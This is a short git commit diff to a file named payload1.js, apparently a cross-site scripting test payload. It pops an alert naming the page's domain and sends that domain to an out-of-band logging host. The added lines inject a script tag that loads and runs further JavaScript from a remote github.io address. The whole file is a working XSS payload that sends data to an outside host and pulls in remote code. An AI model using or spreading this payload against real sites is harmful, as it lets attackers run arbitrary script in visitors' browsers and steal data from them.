ce6849a72726d2fc32e2b63edc1f1c367e1986be
siddhu-1005 <84862560+siddhu-1005@users.noreply.github.com>
2025-07-25 22:15:50 +0530

    payload1.js

--- payload1.js
+++ payload1.js
@@ -3,3 +3,8 @@ alert("XSS ✅ on " + document.domain);
 
 // Or for stealth testing
 new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/log?" + document.domain;
+
+var s = document.createElement('script');
+s.src = "https://siddhu-1005.github.io/Siddhu/payload1.js";
+document.body.appendChild(s);
+
